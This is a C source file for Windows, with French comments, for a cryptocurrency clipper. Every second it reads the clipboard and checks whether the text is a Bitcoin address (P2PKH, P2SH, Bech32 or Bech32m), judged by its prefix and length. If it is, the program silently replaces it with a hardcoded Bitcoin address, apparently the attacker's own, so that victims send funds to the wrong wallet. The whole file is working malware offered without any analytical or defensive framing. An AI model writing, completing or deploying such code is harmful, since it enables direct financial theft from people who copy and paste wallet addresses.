#include <stdio.h>
#include <windows.h>

#include "clipboard.h"
#include "utils.h"
// #include "test.h"

int main(void)
{
    while (true) {
        size_t buffer_size = 256;
        wchar_t buffer[buffer_size];

        if (getClipboardText(buffer, buffer_size) == STATE_ERROR ) {
            printf("[ERROR] -- Failed to get clipboard text.\n");
            return 1;
        }

        int text_size = wcslen(buffer);

        const wchar_t *bitcoin_address = L"bc1qz6nadfl5t8ul977walgphmslclez599t680gxl";
        size_t size_bitcoin_address = getStringSize(bitcoin_address);

        // -------------------------------------------------- Vérification Bitcoin
        // Vérification adresse P2PKH
        if (buffer[0] == L'1') {
            if (text_size >= 26 && text_size <= 35) {
                if (!setClipboardText(bitcoin_address, size_bitcoin_address)) {
                    return 1;
                }
            }
        }

        // Vérification adresse P2SH
        if (buffer[0] == L'3') {
            if (text_size >= 26 && text_size <= 35) {
                if (!setClipboardText(bitcoin_address, size_bitcoin_address)) {
                    return 1;
                }
            }
        }

        // Vérification adresse Bech32
        if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'q') {
            if (text_size == 42 || text_size == 62) {
                if (!setClipboardText(bitcoin_address, size_bitcoin_address)) {
                    return 1;
                }
            }
        }

        // Vérification adresse Bech32m
        if (buffer[0] == L'b' && buffer[1] == L'c' && buffer[2] == L'1' && buffer[3] == L'p') {
            if (text_size == 62) {
                if (!setClipboardText(bitcoin_address, size_bitcoin_address)) {
                    return 1;
                }
            }
        }

        Sleep(1000);
    }

    return 0;
}